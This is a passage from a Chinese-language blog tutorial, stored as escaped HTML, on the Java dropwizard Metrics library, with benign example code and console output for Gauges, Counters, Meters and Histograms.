&#x7528;&#x6765;&#x68C0;&#x6D4B;&#x67D0;&#x4E2A;&#x67D0;&#x4E2A;&#x7CFB;&#x7EDF;&#x662F;&#x5426;&#x5065;&#x5EB7;&#xFF0C;&#x4F8B;&#x5982;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x662F;&#x5426;&#x6B63;&#x5E38;&#x3002;&#x8FD8;&#x6709;<a href=\"https://dropwizard.github.io/metrics/3.1.0/apidocs/com/codahale/metrics/annotation/package-tree.html\" target=\"_blank\" rel=\"external\">Metrics Annotation</a>&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;&#x5730;&#x5B9E;&#x73B0;&#x7EDF;&#x8BA1;&#x67D0;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x67D0;&#x4E2A;&#x503C;&#x7684;&#x6570;&#x636E;&#x3002;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x53EF;&#x4EE5;&#x70B9;&#x8FDB;&#x94FE;&#x63A5;&#x770B;&#x770B;&#x3002;</p>\n<hr>\n<h3 id=\"&#x4F7F;&#x7528;&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;\"><a href=\"#&#x4F7F;&#x7528;&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;\" class=\"headerlink\" title=\"&#x4F7F;&#x7528;&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;\"></a>&#x4F7F;&#x7528;&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;</h3><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7EDF;&#x8BA1;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x88AB;&#x8C03;&#x7528;&#x7684;&#x9891;&#x7387;&#xFF08;TPS&#xFF09;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;Meters&#x3002;&#x5F53;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7EDF;&#x8BA1;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x6267;&#x884C;&#x8017;&#x65F6;&#x65F6;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;Histograms&#x3002;&#x5F53;&#x6211;&#x4EEC;&#x65E2;&#x8981;&#x7EDF;&#x8BA1;TPS&#x53C8;&#x8981;&#x7EDF;&#x8BA1;&#x8017;&#x65F6;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x4F7F;&#x7528;Timers&#x3002;</p>\n<hr>\n<h3 id=\"&#x53C2;&#x8003;&#x8D44;&#x6599;\"><a href=\"#&#x53C2;&#x8003;&#x8D44;&#x6599;\" class=\"headerlink\" title=\"&#x53C2;&#x8003;&#x8D44;&#x6599;\"></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h3><p><a href=\"http://metrics.dropwizard.io/3.1.0/manual/core/\" target=\"_blank\" rel=\"external\">Metrics Core</a><br><a href=\"Metrics Getting Started\">Metrics Getting Started</a></p>\n","excerpt":"","more":"<p>&#x7CFB;&#x7EDF;&#x5F00;&#x53D1;&#x5230;&#x4E00;&#x5B9A;&#x7684;&#x9636;&#x6BB5;&#xFF0C;&#x7EBF;&#x4E0A;&#x7684;&#x673A;&#x5668;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x4E86;&#xFF0C;&#x9664;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x4E1A;&#x52A1;&#x65B9;&#x9762;&#x4E5F;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x670D;&#x52A1;&#x3002;Metrics&#x4F5C;&#x4E3A;&#x4E00;&#x6B3E;&#x76D1;&#x63A7;&#x6307;&#x6807;&#x7684;&#x5EA6;&#x91CF;&#x7C7B;&#x5E93;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;&#x8BB8;&#x591A;&#x5DE5;&#x5177;&#x5E2E;&#x52A9;&#x5F00;&#x53D1;&#x8005;&#x6765;&#x5B8C;&#x6210;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x4F5C;&#x3002;</p>\n<p>&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#x538B;&#x7F29;&#x670D;&#x52A1;&#xFF1A;</p>\n<ul>\n<li>&#x6BCF;&#x79D2;&#x949F;&#x7684;&#x8BF7;&#x6C42;&#x6570;&#x662F;&#x591A;&#x5C11;&#xFF08;TPS&#xFF09;&#xFF1F;</li>\n<li>&#x5E73;&#x5747;&#x6BCF;&#x4E2A;&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x7684;&#x65F6;&#x95F4;&#xFF1F;</li>\n<li>&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x7684;&#x6700;&#x957F;&#x8017;&#x65F6;&#xFF1F;</li>\n<li>&#x7B49;&#x5F85;&#x5904;&#x7406;&#x7684;&#x8BF7;&#x6C42;&#x961F;&#x5217;&#x957F;&#x5EA6;&#xFF1F;</li>\n</ul>\n<p>&#x53C8;&#x6216;&#x8005;&#x4E00;&#x4E2A;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#xFF1A;</p>\n<ul>\n<li>&#x7F13;&#x5B58;&#x7684;&#x547D;&#x4E2D;&#x7387;&#xFF1F;</li>\n<li>&#x5E73;&#x5747;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x7684;&#x65F6;&#x95F4;&#xFF1F;</li>\n</ul>\n<p>&#x57FA;&#x672C;&#x4E0A;&#x6BCF;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x3001;&#x5E94;&#x7528;&#x90FD;&#x9700;&#x8981;&#x505A;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD9;&#x9700;&#x8981;&#x5C3D;&#x91CF;&#x4EE5;&#x5C11;&#x91CF;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x5B9E;&#x73B0;&#x7EDF;&#x8BA1;&#x67D0;&#x7C7B;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;&#x3002;</p>\n<p>&#x4EE5;Java&#x4E3A;&#x4F8B;&#xFF0C;&#x76EE;&#x524D;&#x6700;&#x4E3A;&#x6D41;&#x884C;&#x7684;metrics&#x5E93;&#x662F;&#x6765;&#x81EA;Coda Hale &#x7684; dropwizard/metrics&#xFF0C;&#x8BE5;&#x5E93;&#x88AB;&#x5E7F;&#x6CDB;&#x5730;&#x5E94;&#x7528;&#x4E8E;&#x5404;&#x4E2A;&#x77E5;&#x540D;&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#x4E2D;&#x3002;&#x4F8B;&#x5982; Hadoop&#xFF0C;Kafka&#xFF0C;Spark&#xFF0C;JStorm &#x4E2D;&#x3002;</p>\n<p>&#x672C;&#x6587;&#x5C31;&#x7ED3;&#x5408;&#x8303;&#x4F8B;&#x6765;&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;&#x4E0B; dropwizard/metrics &#x7684;&#x6982;&#x5FF5;&#x548C;&#x7528;&#x6CD5;&#x3002;</p>\n<hr>\n<h3 id=\"Maven-&#x914D;&#x7F6E;\"><a href=\"#Maven-&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"Maven &#x914D;&#x7F6E;\"></a>Maven &#x914D;&#x7F6E;</h3><p>&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;pom.xml&#x4E2D;&#x4F9D;&#x8D56; metrics-core &#x5305;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependencies&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;io.dropwizard.metrics&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;metrics-core&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;<span class=\"variable\">${metrics.version}</span>&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></p>\n<p><strong><em>&#x6CE8;&#xFF1A;&#x5728;POM&#x6587;&#x4EF6;&#x4E2D;&#x9700;&#x8981;&#x58F0;&#x660E; ${metrics.version} &#x7684;&#x5177;&#x4F53;&#x7248;&#x672C;&#x53F7;&#xFF0C;&#x5982; 3.1.0</em></strong></p>\n<hr>\n<h3 id=\"Metric-Registries\"><a href=\"#Metric-Registries\" class=\"headerlink\" title=\"Metric Registries\"></a>Metric Registries</h3><p>MetricRegistry&#x7C7B;&#x662F;Metrics&#x7684;&#x6838;&#x5FC3;&#xFF0C;&#x5B83;&#x662F;&#x5B58;&#x653E;&#x5E94;&#x7528;&#x4E2D;&#x6240;&#x6709;metrics&#x7684;&#x5BB9;&#x5668;&#x3002;&#x4E5F;&#x662F;&#x6211;&#x4EEC;&#x4F7F;&#x7528; Metrics &#x5E93;&#x7684;&#x8D77;&#x70B9;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MetricRegistry registry = new MetricRegistry();</span><br></pre></td></tr></table></figure>\n<p>&#x6BCF;&#x4E00;&#x4E2A; metric &#x90FD;&#x6709;&#x5B83;&#x72EC;&#x4E00;&#x65E0;&#x4E8C;&#x7684;&#x540D;&#x5B57;&#xFF0C;Metrics &#x4E2D;&#x4F7F;&#x7528;&#x53E5;&#x70B9;&#x540D;&#x5B57;&#xFF0C;&#x5982; com.example.Queue.size&#x3002;&#x5F53;&#x4F60;&#x5728; com.example.Queue &#x4E0B;&#x6709;&#x4E24;&#x4E2A; metric &#x5B9E;&#x4F8B;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x5730;&#x66F4;&#x5177;&#x4F53;&#xFF1A;com.example.Queue.requests.size &#x548C; com.example.Queue.response.size &#x3002;&#x4F7F;&#x7528;MetricRegistry&#x7C7B;&#xFF0C;&#x53EF;&#x4EE5;&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x5730;&#x751F;&#x6210;&#x540D;&#x5B57;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MetricRegistry.name(Queue.class, <span class=\"string\">&quot;requests&quot;</span>, <span class=\"string\">&quot;size&quot;</span>)</span><br><span class=\"line\">MetricRegistry.name(Queue.class, <span class=\"string\">&quot;responses&quot;</span>, <span class=\"string\">&quot;size&quot;</span>)</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"Metrics-&#x6570;&#x636E;&#x5C55;&#x793A;\"><a href=\"#Metrics-&#x6570;&#x636E;&#x5C55;&#x793A;\" class=\"headerlink\" title=\"Metrics &#x6570;&#x636E;&#x5C55;&#x793A;\"></a>Metrics &#x6570;&#x636E;&#x5C55;&#x793A;</h3><p>Metircs &#x63D0;&#x4F9B;&#x4E86; Report &#x63A5;&#x53E3;&#xFF0C;&#x7528;&#x4E8E;&#x5C55;&#x793A; metrics &#x83B7;&#x53D6;&#x5230;&#x7684;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#x3002;metrics-core&#x4E2D;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x4E86;&#x56DB;&#x79CD; reporter&#xFF1A; JMX, console, SLF4J, &#x548C; CSV&#x3002; &#x5728;&#x672C;&#x6587;&#x7684;&#x4F8B;&#x5B50;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4F7F;&#x7528; ConsoleReporter &#x3002;</p>\n<hr>\n<h3 id=\"&#x4E94;&#x79CD;-Metrics-&#x7C7B;&#x578B;\"><a href=\"#&#x4E94;&#x79CD;-Metrics-&#x7C7B;&#x578B;\" class=\"headerlink\" title=\"&#x4E94;&#x79CD; Metrics &#x7C7B;&#x578B;\"></a>&#x4E94;&#x79CD; Metrics &#x7C7B;&#x578B;</h3><h4 id=\"Gauges\"><a href=\"#Gauges\" class=\"headerlink\" title=\"Gauges\"></a>Gauges</h4><p>&#x6700;&#x7B80;&#x5355;&#x7684;&#x5EA6;&#x91CF;&#x6307;&#x6807;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x60F3;&#x8861;&#x91CF;&#x4E00;&#x4E2A;&#x5F85;&#x5904;&#x7406;&#x961F;&#x5217;&#x4E2D;&#x4EFB;&#x52A1;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class GaugeTest {</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Queue&lt;String&gt; q = new LinkedList&lt;String&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        MetricRegistry registry = new MetricRegistry();</span><br><span class=\"line\">        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();</span><br><span class=\"line\">        reporter.start(1, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        registry.register(MetricRegistry.name(GaugeTest.class, <span class=\"string\">&quot;queue&quot;</span>, <span class=\"string\">&quot;size&quot;</span>), </span><br><span class=\"line\">        new Gauge&lt;Integer&gt;() {</span><br><span class=\"line\"></span><br><span class=\"line\">            public Integer <span class=\"function\"><span class=\"title\">getValue</span></span>() {</span><br><span class=\"line\">                <span class=\"built_in\">return</span> q.size();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        });</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){</span><br><span class=\"line\">            Thread.sleep(1000);</span><br><span class=\"line\">            q.add(<span class=\"string\">&quot;Job-xxx&quot;</span>);</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- Gauges ------------------------------------------------</span><br><span class=\"line\">com.alibaba.wuchong.metrics.GaugeTest.queue.size</span><br><span class=\"line\">             value = 6</span><br></pre></td></tr></table></figure></p>\n<p>&#x5176;&#x4E2D;&#x7B2C;7&#x884C;&#x548C;&#x7B2C;8&#x884C;&#x6DFB;&#x52A0;&#x4E86;ConsoleReporter&#xFF0C;&#x53EF;&#x4EE5;&#x6BCF;&#x79D2;&#x949F;&#x5C06;&#x5EA6;&#x91CF;&#x6307;&#x6807;&#x6253;&#x5370;&#x5728;&#x5C4F;&#x5E55;&#x4E0A;&#xFF0C;&#x7406;&#x89E3;&#x8D77;&#x6765;&#x4F1A;&#x66F4;&#x6E05;&#x695A;&#x3002;</p>\n<p>&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;&#x961F;&#x5217;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x60F3;&#x7B80;&#x5355;&#x5730;&#x8FD4;&#x56DE;queue.size()&#xFF0C;&#x56E0;&#x4E3A;java.util&#x548C;java.util.concurrent&#x4E2D;&#x5B9E;&#x73B0;&#x7684;#size()&#x65B9;&#x6CD5;&#x5F88;&#x591A;&#x90FD;&#x662F; O(n) &#x7684;&#x590D;&#x6742;&#x5EA6;&#xFF0C;&#x8FD9;&#x4F1A;&#x5F71;&#x54CD; Gauge &#x7684;&#x6027;&#x80FD;&#x3002;</p>\n<h4 id=\"Counters\"><a href=\"#Counters\" class=\"headerlink\" title=\"Counters\"></a>Counters</h4><p>Counter &#x5C31;&#x662F;&#x8BA1;&#x6570;&#x5668;&#xFF0C;Counter &#x53EA;&#x662F;&#x7528; Gauge &#x5C01;&#x88C5;&#x4E86; AtomicLong &#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4F7F;&#x5F97;&#x83B7;&#x5F97;&#x961F;&#x5217;&#x5927;&#x5C0F;&#x66F4;&#x52A0;&#x9AD8;&#x6548;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class CounterTest {</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Queue&lt;String&gt; q = new LinkedBlockingQueue&lt;String&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Counter pendingJobs;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Random random = new Random();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void addJob(String job) {</span><br><span class=\"line\">        pendingJobs.inc();</span><br><span class=\"line\">        q.offer(job);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public static String <span class=\"function\"><span class=\"title\">takeJob</span></span>() {</span><br><span class=\"line\">        pendingJobs.dec();</span><br><span class=\"line\">        <span class=\"built_in\">return</span> q.poll();</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        MetricRegistry registry = new MetricRegistry();</span><br><span class=\"line\">        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();</span><br><span class=\"line\">        reporter.start(1, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        pendingJobs = registry.counter(MetricRegistry.name(Queue.class,<span class=\"string\">&quot;pending-jobs&quot;</span>,<span class=\"string\">&quot;size&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        int num = 1;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){</span><br><span class=\"line\">            Thread.sleep(200);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (random.nextDouble() &gt; 0.7){</span><br><span class=\"line\">                String job = takeJob();</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;take job : &quot;</span>+job);</span><br><span class=\"line\">            }<span class=\"keyword\">else</span>{</span><br><span class=\"line\">                String job = <span class=\"string\">&quot;Job-&quot;</span>+num;</span><br><span class=\"line\">                addJob(job);</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;add job : &quot;</span>+job);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            num++;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add job : Job-15</span><br><span class=\"line\">add job : Job-16</span><br><span class=\"line\">take job : Job-8</span><br><span class=\"line\">take job : Job-10</span><br><span class=\"line\">add job : Job-19</span><br><span class=\"line\">15-8-1 16:11:31 ============================================</span><br><span class=\"line\">-- Counters ----------------------------------------------</span><br><span class=\"line\">java.util.Queue.pending-jobs.size</span><br><span class=\"line\">             count = 5</span><br></pre></td></tr></table></figure>\n<h4 id=\"Meters\"><a href=\"#Meters\" class=\"headerlink\" title=\"Meters\"></a>Meters</h4><p>Meter&#x5EA6;&#x91CF;&#x4E00;&#x7CFB;&#x5217;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#x7684;&#x901F;&#x7387;(rate)&#xFF0C;&#x4F8B;&#x5982;TPS&#x3002;Meters&#x4F1A;&#x7EDF;&#x8BA1;&#x6700;&#x8FD1;1&#x5206;&#x949F;&#xFF0C;5&#x5206;&#x949F;&#xFF0C;15&#x5206;&#x949F;&#xFF0C;&#x8FD8;&#x6709;&#x5168;&#x90E8;&#x65F6;&#x95F4;&#x7684;&#x901F;&#x7387;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MeterTest {</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Random random = new Random();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void request(Meter meter){</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">        meter.mark();</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void request(Meter meter, int n){</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(n &gt; 0){</span><br><span class=\"line\">            request(meter);</span><br><span class=\"line\">            n--;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        MetricRegistry registry = new MetricRegistry();</span><br><span class=\"line\">        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();</span><br><span class=\"line\">        reporter.start(1, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        Meter meterTps = registry.meter(MetricRegistry.name(MeterTest.class,<span class=\"string\">&quot;request&quot;</span>,<span class=\"string\">&quot;tps&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){</span><br><span class=\"line\">            request(meterTps,random.nextInt(5));</span><br><span class=\"line\">            Thread.sleep(1000);</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request</span><br><span class=\"line\">15-8-1 16:23:25 ============================================</span><br><span class=\"line\"></span><br><span class=\"line\">-- Meters ------------------------------------------------</span><br><span class=\"line\">com.alibaba.wuchong.metrics.MeterTest.request.tps</span><br><span class=\"line\">             count = 134</span><br><span class=\"line\">         mean rate = 2.13 events/second</span><br><span class=\"line\">     1-minute rate = 2.52 events/second</span><br><span class=\"line\">     5-minute rate = 3.16 events/second</span><br><span class=\"line\">    15-minute rate = 3.32 events/second</span><br></pre></td></tr></table></figure>\n<p><strong><em>&#x6CE8;&#xFF1A;&#x975E;&#x5E38;&#x50CF; Unix &#x7CFB;&#x7EDF;&#x4E2D; uptime &#x548C; top &#x4E2D;&#x7684; load&#x3002;</em></strong></p>\n<h4 id=\"Histograms\"><a href=\"#Histograms\" class=\"headerlink\" title=\"Histograms\"></a>Histograms</h4><p>Histogram&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#x7684;&#x5206;&#x5E03;&#x60C5;&#x51B5;&#x3002;&#x6BD4;&#x5982;&#x6700;&#x5C0F;&#x503C;&#xFF0C;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x4E2D;&#x95F4;&#x503C;&#xFF0C;&#x8FD8;&#x6709;&#x4E2D;&#x4F4D;&#x6570;&#xFF0C;75&#x767E;&#x5206;&#x4F4D;, 90&#x767E;&#x5206;&#x4F4D;, 95&#x767E;&#x5206;&#x4F4D;, 98&#x767E;&#x5206;&#x4F4D;, 99&#x767E;&#x5206;&#x4F4D;, &#x548C; 99.9&#x767E;&#x5206;&#x4F4D;&#x7684;&#x503C;(percentiles)&#x3002;</p>\n<p>&#x6BD4;&#x5982;request&#x7684;&#x5927;&#x5C0F;&#x7684;&#x5206;&#x5E03;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class HistogramTest {</span><br><span class=\"line\">    public static Random random = new Random();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        MetricRegistry registry = new MetricRegistry();</span><br><span class=\"line\">        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();</span><br><span class=\"line\">        reporter.start(1, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        Histogram histogram = new Histogram(new ExponentiallyDecayingReservoir());</span><br><span class=\"line\">        registry.register(MetricRegistry.name(HistogramTest.class, <span class=\"string\">&quot;request&quot;</span>, <span class=\"string\">&quot;histogram&quot;</span>), histogram);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){</span><br><span class=\"line\">            Thread.sleep(1000);</span><br><span class=\"line\">            histogram.update(random.nextInt(100000));</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7ED3;&#x679C;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 